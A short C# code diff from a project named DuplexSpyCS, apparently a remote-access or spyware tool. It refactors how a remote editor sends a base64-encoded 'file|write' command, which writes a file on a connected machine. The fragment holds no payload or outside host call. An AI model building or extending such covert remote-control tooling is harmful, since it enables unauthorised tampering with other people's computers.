@@ -240,7 +240,7 @@ namespace DuplexSpyCS
                     {
                         if (v == null)
                             MessageBox.Show("NULL");
-                        v.encSend(2, 0, $"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
+                        v.fnSendCommand($"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
                     }
                 }
                 else if (e.KeyCode == Keys.T)
